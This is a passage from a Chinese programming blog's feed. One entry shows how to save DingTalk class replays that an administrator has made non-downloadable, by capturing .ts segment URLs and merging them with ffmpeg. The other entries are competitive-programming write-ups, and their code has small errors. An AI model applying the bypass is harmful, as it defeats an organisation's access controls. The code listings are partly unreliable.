        <content type="html"><![CDATA[<p>最近需要下载钉钉的录屏回放，但是管理员禁止了下载，找到了众多的方法都不得行，后面自己开辟了一个方法（我也不敢确定是不是没有人用这个方法，反正这个方法不是通过搜索得到的。。</p><span id="more"></span><p>先说说我通过搜索资源得到了些什么方法吧，其实大多数就指向一种方法——通过fd抓包找到m3u8的下载地址，然而我在用fd抓包的时候并没有找到m3u8的下载地址，也有说用旧版本的钉钉的，但是我发现根本扫不上去，于是我仔细观察fd得到的包，发现播放视频的时候大部分出现了 .TS文件格式的url请求。</p><p><img src="/2022/03/20/Dingtalk/1.png" alt="1"></p><p>可以看到每过一会就会请求一个对应的 <code>ts</code> 文件，我也去搜了一下 <code>ts</code> 文件的含义，差不多就是视频的切片。因此如果我能得到所有的ts的下载地址，那么我就相当于得到了这个视频。</p><p>但是在请求这个 <code>ts</code> 文件的时候必须加上一个 <code>auth_key</code> 参数，然后这个参数貌似也是个随机的散列值，目前信息有限没办法计算出这个散列值的排布规律，但是我能得到一个最朴素的做法：暴力得到所有的 <code>ts</code> 的url，然后一个一个下载，最后用 <code>ffmpeg</code> 去合并就好了。</p><p>然而这里我们并不需要看完所有的视频，我们可以快进，我理解的原理是这样的：假如把你的视频切成 20S一片，在你需要的时候请求，然而假如我不看完，直接跳过这个请求，那么它马上就会请求下一个视频的地址，然后此时被我们捕获到了，之后循环往复我们就能快速地得到所有的请求url，这里的话仅复制url可以快速把url全部复制过来。</p><p>这里我选择按键模拟器去点击这个右键播放，然后间隔频率设置成0.2S，每看1S跳过50S，相当于快进50倍，一个50min的视频我们在1min就能整完，这个效率还是不错的，如果发现ts有丢失那么你可以定位到那个地方重新观察一下请求，然后url复制过来。</p><p><img src="/2022/03/20/Dingtalk/2.png" alt="2"></p><p>我本来想这么多url用爬虫读取url一个个爬然后保存的，结果不知道为啥报错了，于是我选择最蠢的办法：cmd命令。</p><p>在所有url前加上start，然后后缀改一下bat，为了防止电脑卡顿，在每一个start前加上一个暂停的命令，然后我们得到了一个这样的文件：</p><p><img src="/2022/03/20/Dingtalk/3.png" alt="3"></p><p>最后就是枯燥的请求了，这个等着吧，如果你觉得电脑hold的住那么你可以不加暂停的，它会周期弹网页出来，情况就是这样子的：</p><p><img src="/2022/03/20/Dingtalk/4.png" alt="4"></p><p>我还发现一个问题，就是它有时候这个回放并不是严格的就是正整数递增的，中间我有遇到过那种 <code>10000001.ts</code> 的文件，就是突然这样的，也不知道为啥，所以最后写合并指令的时候也比较难，但是难处千千万，靠自己还是能解决的。选择直接在里面放一个python脚本自动合并，合并的命令是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i &quot;concat:文件1|文件2|文件3|……|文件n&quot; -c copy output.mp4</span><br></pre></td></tr></table></figure><p>里面主要的就是要扫一下目录获取所有的文件名并让他们按一定顺序排列，这个我也直接放一下吧，也挺简单的，没什么需要解释的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f=os.listdir(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">2</span>:]!=<span class="string">&#x27;ts&#x27;</span>:<span class="keyword">continue</span></span><br><span class="line">    num.append(<span class="built_in">int</span>(i[:-<span class="number">3</span>]))</span><br><span class="line">num.sort()</span><br><span class="line">fi=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> num:</span><br><span class="line">    fi+=<span class="built_in">str</span>(q)+<span class="string">&#x27;.ts|&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;ffmpeg -i &quot;concat:&#x27;</span>+fi[:-<span class="number">1</span>]+<span class="string">&#x27;&quot; -c copy output.mp4&#x27;</span></span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>如果不放心可以先print一下看看得到的cmd是什么样的，下面给出我的目录图和运行图：</p><p><img src="/2022/03/20/Dingtalk/5.png" alt="5"></p><p>最后就是运行一遍那个命令了，看看有没有得到你们心心念念的视频吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CF1626C</title>
      <link href="/2022/03/19/CF1626C/"/>
      <url>/2022/03/19/CF1626C/</url>
      
        <content type="html"><![CDATA[<p>一道思维好题，写篇题解纪念一下。</p><span id="more"></span><h3 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h3><p>有 $n$ 个敌人，你需要在第 $k_i$ 秒用至少 $h_i$ 的攻击力打败这个敌人。</p><p>攻击力的计算方式如下：</p><ol><li> 第一秒时，你有 $1$ 攻击力</li><li> 对于后面的任意一秒，若前一秒你的攻击力为 $x$，则这一秒你的攻击力可以为 $x+1$ 或 $1$</li></ol><p>一秒内，如果你的攻击力为 $x$，则你就需要消耗 $x$ 的能量。</p><p>请问，在你打败所有敌人的情况下，最少需要消耗多少能量。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>在一秒内，你可以继承之前的攻击力，但是继承攻击力的代价就是你要花费相当于继承之后攻击力的法力值来保存你的攻击力。只有当前攻击力大于当前出现的怪物的血量的时候，你才能杀死他。在任意一秒，你可以选择摆烂，但是摆烂的代价就是会丢失上一秒的攻击力，使你在下一秒的时候无法有之前那么高的攻击，摆烂可以选择从 $0$ 开始或者从 $1$ 开始。显然可以发现，当 $k_i\ge h_i$ 的时候，主角总是有办法杀死所有的怪物的。 </p><p>在杀死所有的怪物的怪物下要保证消耗的法力值最少，那就需要我们合理分配增加攻击的时间了。我们不难得出以下结论：</p><p>如果在第 $k_i$ 秒遇到了血量为 $h_i$ 的怪物，那么在 $(k_i-h_i,k_i]$ 的时间区间内，我不能出现摆烂的情况，即攻击力不能掉，在 $k_i-h_i$ 的时刻，攻击力不能减为 $0$。</p><p>那么第 $i$ 个怪物需要我花费的最少法力值就是从 $1$ 到 $h_i$ 的等差数列，假设我打完怪物之后我都能立刻摆烂，那么不难得出总法力消耗就是 $\sum _{i=1}^{n} \sum _{j=1}^{h_i} j$ 。但是并不是每一次打完怪物我都能摆烂，如果我摆烂到 $0$，剩下的时间不足以我积攒足够的攻击去击杀接下来的怪物那就不能摆烂而是接着蓄力。</p><p>对于每一个怪物我们都构造一个区间，区间范围为 $[k_i-h_i+1,k_i]$ ，当区间出现相交，则合并两个区间，最后根据区间长度计算法力值即可。</p><p>对于每一个区间我观察我的左端点是否会落在上一个区间内，如果在，则需要合并前面的区间，因为我们默认按照 $k_i$ 排序了，也就是按照区间右端点值排序，所以我可以用 $\text{lower_bound}$ 来寻找合并的区间。因为如果最后一个怪物它要求我从第一秒开始蓄力的话，那么前面的所有区间我都要合并，所以这里必须考虑合并的区间。对于合并的区间我们修改 $l$ 为其中最小值，$r$ 为其中最大值。然后在计算区间的时候特判一下连续的区间是否相等，达到只计算一次的目的即可。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 105</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> h[maxn],k[maxn],l[maxn],r[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(l,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(l));</span><br><span class="line">    <span class="built_in">memset</span>(r,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(l));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;k[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;h[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        l[i]=k[i]-h[i]+<span class="number">1</span>;</span><br><span class="line">        r[i]=k[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[i]&lt;=r[i<span class="number">-1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> j=i;</span><br><span class="line">            <span class="keyword">int</span> p=<span class="built_in">lower_bound</span>(r+<span class="number">1</span>,r+<span class="number">1</span>+i,l[i])-r;</span><br><span class="line">            <span class="comment">//if(p==0)p++;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=p;j&lt;=i;j++)&#123;</span><br><span class="line">                l[j]=<span class="built_in">min</span>(l[p],l[i]);</span><br><span class="line">                r[j]=r[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[i]==l[i<span class="number">-1</span>]&amp;&amp;r[i]==r[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> num=r[i]-l[i]+<span class="number">1</span>;</span><br><span class="line">        ans+=<span class="number">1ll</span>*(num+<span class="number">1</span>)*num/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(l[i]-r[i<span class="number">-1</span>]&gt;<span class="number">1</span>&amp;&amp;l[i<span class="number">-1</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            ;<span class="comment">//ans+=l[i]-r[i-1]-1;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kruskal 重构树的学习笔记</title>
      <link href="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/"/>
      <url>/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>比赛遇到了新鲜的图论题，特此记录。</p><span id="more"></span><h2 id="什么是Kruskal重构树？"><a href="#什么是Kruskal重构树？" class="headerlink" title="什么是Kruskal重构树？"></a>什么是Kruskal重构树？</h2><p> $\text{Kruskal}$ 重构树，和 $\text{Kruskal}$ 算法的思想差不多，就是在这个过程中建出一个有着非常优秀的性质的数据结构，这是一个非常少见和小众的算法，但是如果碰到了合适的题目，就会体现出其优越性。</p><h2 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h2><p>既然它叫 $\text{Kruskal}$ 重构树，那么它必然与 $\text{Kruskal}$ 有着密不可分的联系。首先我们回顾一下 $\text{Kruskal}$ 最小生成树是怎么实现的，先将所有边按照权值排序，然后再从小到大添加边，如果添加边的两个顶点都在生成树当中则跳过这条边，直到添加过n-1次算法结束。</p><p>我们在添加边的时候构造一棵这样的树：当边e被添加时，e的两顶点一定在不同的生成树内，因此将两个顶点所在的树用一个点连接起来，点的权值为这条边的权值，这个点的权值表示了什么呢？就是这两个子树上，其中一个子树所有的顶点到另一个子树的所有顶点中经过的边的最大值的最小值为这条边的边权。</p><p>首先先解释一下什么叫<strong>最大值的最小值</strong>，这句话可能有点抽象，那我具体举一个例子。我一个节点从 $u\to v$ 有可能经过多条边，这里面的最大值是我要计算的，而可能不止这一种走法，我现在希望这个最大值最小，这就是所谓的最大值的最小值啦。最大值指的是一条路径的最大值，最小值指的是所有路径中的这个值最小。</p><p>其次，很容易证明我们得到的树是一颗二叉树，因为对于n个点，每次我都是添加根节点连接两个子树或者节点，也很容易证明叶节点都为原图中的节点，因为我们只为这些节点不停地添加父亲而没有给他们儿子，自然就是叶子节点啦。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>exp(指example</p><p>举个例子，下面这个图。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/1.png" alt="1"></p><p>第一步，我们先选择1和2，发现不在同一集合，选择添加，我们新建一个节点来作为它们的父亲，它的点的权值为1，这里我换个颜色避免引起歧义，这里的1表示值而不是编号。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/2.png" alt="2"></p><p>重复第一步，找到2，然后。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/3.png" alt="3"></p><p>然后找到权值为3的点，发现1，3同属于一个树，跳过。再找到4，添加，得到下面这张图。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/4.png" alt="4"></p><p>我们来看看符不符合我们上面总结的那个结论。</p><p>1和2我们走过的最短路径显然就是1；1到3我们需要走过路径最大值的最小值是2，虽然我能一步到达，但是先走2，再走3我们的路径长度为 $\to 1\to 2 \to$ 显然这样走过的最长的路的最小值就是2了，可以发现1和3由根节点权值为2的点连接，也没问题，同理其它任何四个点两两之间都符合这个规律。</p><p>在实现上面我们可以通过LCA来快速查询两个点之间的最大路径的最小值，因为也可以发现两个点之间的LCA的权值就是我想要的答案，这一部分可以倍增预处理然后打到一次 $log_2n$ 的复杂度。</p><h2 id="有什么用？"><a href="#有什么用？" class="headerlink" title="有什么用？"></a>有什么用？</h2><p>这应该是我们最应该关心的问题了，学了一个数据结构应该想办法加以利用。来看一道经典例题：</p><hr><p>给出n个点，m条边构成的无向图，要求指定两点，算出它们之间的最短路径值。</p><p>这题很容易知道可以使用单源最短路算法，但是我们也会想到动态规划。因为我到了一个点之后，我不需要关心这个点是怎么到的，这个叫无后效性，即前面的决策不影响后面的答案。</p><p>那我们对此题稍微改一下：要求求出所有我经过路径最大值的最小值是多少？</p><p>这题显然，也是无后效性我们只需要一步步往前推然后保存最大值即可。但是问题来了，如果我再加上多个询问呢？那么此时算法的时间复杂度将加上n倍，一次处理相当于进行一次的 $\text{dijkstra}$，$O(nlog_2n)$的复杂度，妥妥的超时。如果我们选择 $\text{Kruskal}$ 重构树预处理，再加上加上LCA，把一次询问的复杂度降低到 $O(log_2n)$ ，那么最终得到的算法复杂度就会低很多了。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>直接拿上ICPC2021上海站的I题——<a href="https://ac.nowcoder.com/acm/contest/29789/H">Life is a game</a></p><hr><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>Life is a game.</p><p> The world can be regarded as an undirected connected graph of $n$ cities and mmm undirected roads between the cities. Now you, the life game player, are going to play the life game on the world graph.</p><p> Initially, you are at the $x$-th city and of $k$ social ability points. You can earn social ability points by living and working. Specifically, you can earn $a_i$ social ability points by living and working in the $i$-th city. But in this problem, you cannot earn social ability points duplicatedly in one city, so you want to travel the world and earn more social ability points. However, the roads are not easy. Specifically, there is an ability threshold $i$_iwi​ for the $i$-th road, you should be of at least $w_i$ social ability points to go through the road. Moreover, Your social ability point will not decrease when passing roads but just need to be at least $w_i$​ if you want to go through the $i$-th road.</p><p> So as you can see, the life game is just living, working and traveling repeatedly. There are $q$ game saves. For each game save, the initial city and social ability point is given and the player has not lived or worked in any city. Now you, the real life game player, need to determine the maximum possible number of social ability points you can have in the end of the game and output it for each given game save.</p><p>这里来解释一下这个题意。</p><p>就是说有一个 $n$ 点 $m$ 边的无向带权图，每个点上有权值。当你经过一个点，你能获得一定能力值，每个地方的能力值只能获得一次，只有能力值不小于边权我才能通过这条边到达另一个点。给定起点和初始能力值，问你最后最多有多少能力值。</p><p>所以，我们能不能到达另一个点取决于整条路经的最大值是否大于我的能力值，若大于则我不能通过这条路到达该点，如果该最大值最小，则以我目前能力值无法到达该点。</p><p>我们就使用 $\text{Kruskal}$ 构造树，寻找它的祖先节点，可以证明，它祖先节点一定不是叶节点，所以如果我的能力值大于该祖先节点的值，那么我可以任意访问以这个祖先节点为根节点的任意节点，能力值可以直接加上这么多，然后再去寻找祖先节点，直到连它的父亲都无法到达或者是当前节点已经是根节点了，那就结束，那么我最终获得的能力值就是当前节点为根节点的子树的所有能力值之和加上初始值。</p><p>以某某节点为根节点的子树能力值之和可以通过 dfs 在 $O(E)$ 的复杂度得出，排序+ $\text{Kruskal}$ 构造树 $O(E)+O(Elog_2E)$ 的复杂度。寻找根节点可以用预处理倍增查询的方式去得到。这样最终我们每次查询的复杂度就是 $O(log_2n)$ 的复杂度。在本题我们可以认为它都是 $n$ ，因为它们的最大值都是一样的，这样的复杂度最终能被接受。</p><p>这里给出我写的程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="comment">//int不够直接int改long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> from;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cin&gt;&gt;from&gt;&gt;to&gt;&gt;w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> eee &amp;a)&#123;<span class="comment">//重载小于号便于排序</span></span><br><span class="line">        <span class="keyword">return</span> w&lt;a.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;e[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v[maxn&lt;&lt;<span class="number">1</span>],root[maxn&lt;&lt;<span class="number">1</span>],fa[maxn&lt;&lt;<span class="number">1</span>],value[maxn&lt;&lt;<span class="number">1</span>],a[maxn&lt;&lt;<span class="number">1</span>],dep[maxn&lt;&lt;<span class="number">1</span>],n,m,q,cnt;</span><br><span class="line"><span class="keyword">int</span> lca[maxn&lt;&lt;<span class="number">1</span>][<span class="number">30</span>];<span class="comment">//这里忘开两倍内存导致2小时的TLE RE WA各种的问题。</span></span><br><span class="line"><span class="comment">//v表示节点权值，value表示子树a和，a表示该点的能量 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fa[x] == x ? x : fa[x] = <span class="built_in">find</span>(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n<span class="number">-1</span>;i++)fa[i]=i;<span class="comment">//初始化集合</span></span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> from=e[i].from,to=e[i].to;</span><br><span class="line">        from=<span class="built_in">find</span>(from),to=<span class="built_in">find</span>(to);<span class="comment">//寻找并查集</span></span><br><span class="line">        <span class="keyword">if</span>(from==to)<span class="keyword">continue</span>;</span><br><span class="line">        v[++j+n]=e[i].w;<span class="comment">//新建一个点，点权为该边边权，并连接这两个点</span></span><br><span class="line">        <span class="built_in">add</span>(from,j+n);<span class="comment">//添加两个边。</span></span><br><span class="line">        <span class="built_in">add</span>(j+n,from);</span><br><span class="line">        <span class="built_in">add</span>(to,j+n);</span><br><span class="line">        <span class="built_in">add</span>(j+n,to);</span><br><span class="line">        fa[from]=fa[j+n];<span class="comment">//让这两个点的父亲都指向这个节点，这其实相当于一个集合的合并。</span></span><br><span class="line">        fa[to]=fa[j+n];</span><br><span class="line">        <span class="keyword">if</span>(j==n<span class="number">-1</span>)<span class="keyword">break</span>;<span class="comment">//寻找到n-1条边之后则直接退出</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> father)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=a[now];</span><br><span class="line">    fa[now]=father;</span><br><span class="line">    lca[now][<span class="number">0</span>]=father;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">17</span>;i++)&#123;</span><br><span class="line">        lca[now][i]=lca[lca[now][i<span class="number">-1</span>]][i<span class="number">-1</span>]<span class="comment">//直接整，暴力出log_2(1e5)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;<span class="comment">//朴实无华的深搜</span></span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to==father)<span class="keyword">continue</span>;</span><br><span class="line">        ans+=<span class="built_in">dfs</span>(to,now);</span><br><span class="line">    &#125;</span><br><span class="line">    value[now]=ans;<span class="comment">//保存该节点为根节点时的所有子孙节点上的能力值</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        e[i].<span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//以上为输入</span></span><br><span class="line">    <span class="built_in">sort</span>(e+<span class="number">1</span>,e+<span class="number">1</span>+m);<span class="comment">//边按照权值排序</span></span><br><span class="line">    <span class="built_in">Kruskal</span>();<span class="comment">//重构树</span></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">2</span>*n<span class="number">-1</span>,<span class="number">0</span>);<span class="comment">//深搜填value，获得以每个节点为根节点能获得的能力值，顺便处理一下LCA</span></span><br><span class="line">    v[<span class="number">0</span>]=<span class="number">1e18</span>;<span class="comment">//防止到0之后无法终止递归</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,k;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;k;</span><br><span class="line">        <span class="keyword">int</span> t=x;</span><br><span class="line">        <span class="keyword">int</span> now=value[x]+k;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> las = x;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">20</span>;i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> fa = lca[x][i];</span><br><span class="line">                <span class="keyword">if</span>(now &gt;= v[fa]) x = fa;</span><br><span class="line">            &#125;</span><br><span 